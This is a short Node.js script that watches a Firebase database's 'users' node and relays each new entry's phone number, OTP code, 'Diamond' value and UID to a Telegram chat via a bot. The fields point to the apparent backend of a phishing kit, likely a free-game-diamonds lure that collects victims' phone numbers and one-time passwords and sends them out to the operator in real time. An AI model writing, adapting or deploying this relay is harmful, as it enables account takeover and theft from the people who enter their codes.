import admin from "firebase-admin";
import fetch from "node-fetch";
import fs from "fs";

// =====================
// Load Firebase Service Account from Render Secret
// =====================
const serviceAccount = JSON.parse(
  fs.readFileSync("/etc/secrets/serviceAccountKey.json", "utf8")
);

// Initialize Firebase
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://siyamhasansiyam-2c149-default-rtdb.firebaseio.com"
});

const db = admin.database();

// =====================
// Telegram Bot Config
// =====================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Set this in Render Environment Variables
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;     // Set this in Render Environment Variables

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("❌ Telegram Bot Token or Chat ID not set in Environment Variables!");
  process.exit(1);
}

// =====================
// Helper function to send message to Telegram
// =====================
async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });
  } catch (err) {
    console.error("Telegram send error:", err);
  }
}

// =====================
// Listen to Firebase Realtime Database
// =====================
const usersRef = db.ref("users");

usersRef.on("child_added", async (snapshot) => {
  const userData = snapshot.val();

  let message = `📥 New Data Added:\n`;
  if (userData.NUMBERC) message += `Number: ${userData.NUMBERC}\n`;
  if (userData.OTPC) message += `OTP: ${userData.OTPC}\n`;
  if (userData.DIAMONDC) message += `Diamond: ${userData.DIAMONDC}\n`;
  if (userData.UIDC) message += `UID: ${userData.UIDC}\n`;

  console.log(message); // For debug
  await sendTelegramMessage(message);
});

console.log("✅ Firebase → Telegram listener running...");
